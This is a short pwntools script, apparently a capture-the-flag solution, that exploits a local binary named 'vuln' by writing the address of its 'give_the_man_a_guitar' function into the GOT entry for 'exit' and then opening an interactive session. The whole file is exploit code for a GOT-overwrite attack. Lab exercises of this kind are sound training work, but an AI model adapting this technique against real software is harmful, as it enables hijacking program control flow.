import pwn 

p = pwn.process("./vuln")
elf = pwn.ELF("./vuln")
dest_addr = elf.symbols["give_the_man_a_guitar"]
ret_addr = elf.got["exit"]
p.sendline(b"Y")
p.sendline(str(dest_addr).encode())
p.sendline(str(ret_addr).encode())
p.interactive()